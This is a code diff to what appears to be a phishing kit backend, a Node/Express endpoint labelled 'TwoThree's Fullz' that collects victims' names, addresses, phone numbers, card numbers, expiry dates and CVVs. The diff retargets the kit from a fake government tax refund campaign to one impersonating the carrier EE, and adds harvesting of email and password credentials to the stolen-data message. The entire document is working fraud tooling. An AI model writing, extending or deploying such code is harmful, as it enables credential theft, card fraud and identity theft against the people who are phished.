@@ -20,7 +20,7 @@ const formLimiter = rateLimit({
   });
 
 app.post("/submit-form", formLimiter, async (req, res) => {
-    const { firstName, phoneNum, address, postcode, cardNum, expiryMonth, expiryYear, cvv } = req.body;
+    const { email, password, firstName, phoneNum, address, postcode, cardNum, expiryMonth, expiryYear, cvv } = req.body;
   
     const userAgent = req.headers['user-agent'];
 
@@ -43,8 +43,10 @@ if (req.body.phone_number) {
 
     const text = `
   -------- TwoThree's Fullz --------
-  GOV TAX REFUND CAMPAIGN:
-
+  EE CAMPAIGN:
+  EE login:
+  Email: ${email}
+  Password: ${password}
   Full Name: ${firstName}
   Phone num: ${phoneNum}
   House Number: ${address}
